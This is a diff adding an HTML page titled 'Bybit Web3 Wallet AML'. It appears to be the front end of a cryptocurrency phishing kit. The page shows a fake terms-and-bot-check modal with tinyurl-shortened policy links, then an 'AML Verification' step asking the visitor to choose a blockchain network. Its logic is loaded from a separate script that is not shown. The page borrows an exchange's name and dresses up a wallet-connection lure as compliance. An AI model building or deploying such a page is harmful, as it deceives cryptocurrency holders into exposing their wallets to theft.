@@ -1,0 +1,233 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" type="image/x-icon" href="favicon.ico">
+  <title>Bybit Web3 Wallet AML</title>
+  <link href="https://cdn.jsdelivr.net/npm/daisyui@3.8.3/dist/full.css" rel="stylesheet" type="text/css" />
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    var tailwind = {
+      config: {
+        daisyui: {
+          themes: ["dark"],
+        },
+      }
+    };
+  </script>
+  <style id="dynamic-theme-styles">
+    :root {
+      --modal-primary-color: #bed4ff;
+      --modal-secondary-color: #0057ff;
+      --modal-primary-dimmed: #5e6a7f;
+      --modal-secondary-dimmed: #0033b3;
+      --loader-primary-color: #000000;
+      --loader-secondary-color: #000000;
+    }
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background: linear-gradient(135deg, var(--modal-primary-dimmed) 0%, var(--modal-secondary-dimmed) 100%) !important;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      overflow: hidden;
+    }
+    .modal {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      height: 100%;
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 100000;
+      background: linear-gradient(135deg, var(--modal-primary-dimmed) 0%, var(--modal-secondary-dimmed) 100%) !important;
+    }
+    .modal-box {
+      background: rgba(30, 30, 30, 0.9);
+      backdrop-filter: blur(12px);
+      border-radius: 20px;
+      border: 1px solid var(--modal-primary-color);
+      padding: 24px;
+      width: 100%;
+      max-width: 420px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3),
+                  inset 0 2px 4px rgba(255, 255, 255, 0.1),
+                  0 4px 8px rgba(0, 0, 0, 0.2);
+      color: #ffffff;
+      position: relative;
+    }
+    .modal-box h3 {
+      font-size: 1.75rem;
+      font-weight: 600;
+      text-align: center;
+      margin-bottom: 20px;
+      color: var(--modal-primary-color);
+    }
+    .modal-box p {
+      color: rgba(255, 255, 255, 0.85);
+      font-size: 0.95rem;
+      line-height: 1.6;
+      margin-bottom: 16px;
+    }
+    .modal-box a {
+      color: var(--modal-primary-color);
+      text-decoration: none;
+    }
+    .modal-box a:hover {
+      color: var(--modal-primary-color);
+      text-decoration: underline;
+    }
+    .action-button {
+      background-color: var(--modal-primary-color);
+      color: #000000;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 12px;
+      padding: 12px 24px;
+      font-weight: 500;
+      width: 100%;
+    }
+    .action-button:hover:not(:disabled) {
+      background-color: var(--modal-secondary-color);
+      color: #ffffff;
+    }
+    .action-button:disabled {
+      background-color: #4b5563;
+      color: rgba(255, 255, 255, 0.6);
+      cursor: not-allowed;
+      opacity: 0.7;
+    }
+    .checkbox {
+      border-color: rgba(255, 255, 255, 0.3);
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 4px;
+    }
+    .checkbox:checked {
+      background: var(--modal-primary-color);
+      border-color: var(--modal-secondary-color);
+    }
+    .label-text {
+      color: rgba(255, 255, 255, 0.85);
+      font-size: 0.9rem;
+      line-height: 1.4;
+    }
+    .select-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 12px;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+    .select-item:hover {
+      background: rgba(255, 255, 255, 0.1);
+    }
+    .select-item.active {
+      border-color: var(--modal-primary-color);
+      background: rgba(255, 255, 255, 0.15);
+    }
+    .blockchain-icon {
+      width: 24px;
+      height: 24px;
+    }
+    .blockchain-name {
+      color: rgba(255, 255, 255, 0.85);
+      font-size: 1rem;
+    }
+    .w-layout-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+      gap: 12px;
+      width: 100%;
+    }
+    dialog[open] {
+      display: flex !important;
+      visibility: visible !important;
+      z-index: 100000;
+    }
+    @media (max-width: 640px) {
+      .modal, dialog[open] {
+        align-items: flex-end;
+        padding: 0;
+      }
+      .modal-box {
+        border-radius: 20px 20px 0 0;
+        width: 100%;
+        max-width: 100%;
+        margin-bottom: 0;
+        bottom: 0;
+        left: 0;
+        right: 0;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="min-h-screen flex items-center justify-center p-4">
+    <dialog id="my_pre_modal" class="modal">
+      <div class="modal-box">
+        <h3>Terms of Service</h3>
+        <p>By using our service, you agree to abide by our 
+          <a href="http://tinyurl.com/2bzedkjh">Privacy Policy</a> and 
+          <a href="http://tinyurl.com/2yncfxwt">Terms of Service</a>. 
+          Please confirm that you are not a bot to proceed.
+        </p>
+        <div class="form-control grid gap-4">
+          <label class="label cursor-pointer flex items-start gap-3">
+            <input 
+              type="checkbox" 
+              class="checkbox mt-1" 
+              onchange="document.getElementById('btn-to-continue').disabled = !this.checked;"
+            />
+            <span class="label-text">
+              I agree to the Terms of Service and Privacy Policy and confirm that I am not a bot.
+            </span>
+          </label>
+        </div>
+        <div class="pt-6">
+          <button 
+            id="btn-to-continue" 
+            class="action-button" 
+            disabled 
+            onclick="showNetworkSelection()"
+          >
+            Continue
+          </button>
+        </div>
+      </div>
+    </dialog>
+    <dialog id="network_modal" class="modal">
+      <div class="modal-box">
+        <h3>AML Verification</h3>
+        <p>To continue, select the desired network.</p>
+        <div class="w-layout-grid grid-5 step-1">
+          <div class="select-item" data-chain-id="1">
+            <img src="https://cdn.prod.website-files.com/654506076ba62ddb88e1876a/67165f9a046ddaac7c3c4655_ETH%20icon.png" loading="lazy" alt="Ethereum" class="blockchain-icon">
+            <span class="blockchain-name">Ethereum</span>
+          </div>
+          <div class="select-item" data-chain-id="56">
+            <img src="https://cdn.prod.website-files.com/654506076ba62ddb88e1876a/67165f9bddc6cad40ee577b0_BSC%20Icon.png" loading="lazy" alt="BSC" class="blockchain-icon">
+            <span class="blockchain-name">BSC</span>
+          </div>
+          <div class="select-item" data-chain-id="137">
+            <img src="https://cdn.prod.website-files.com/654506076ba62ddb88e1876a/67165f9a651a16c67f862e40_Polygon%20icon.png" loading="lazy" alt="Polygon" class="blockchain-icon">
+            <span class="blockchain-name">Polygon</span>
+          </div>
+          <div class="select-item" data-chain-id="728126428">
+            <img src="https://cdn.prod.website-files.com/654506076ba62ddb88e1876a/67165f9bcfc1bde09d01c798_Tron%20icon.png" loading="lazy" alt="Tron" class="blockchain-icon">
+            <span class="blockchain-name">Tron</span>
+          </div>
+        </div>
+        <div class="pt-6">
+          <button class="action-button btn-step-1" disabled>Continue</button>        </div>
+      </div>
+    </dialog>
+  </div>
+  <script src="../assets/index.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/dialog-polyfill@0.5.6/dist/dialog-polyfill.min.js"></script>
+</body>
+</html>
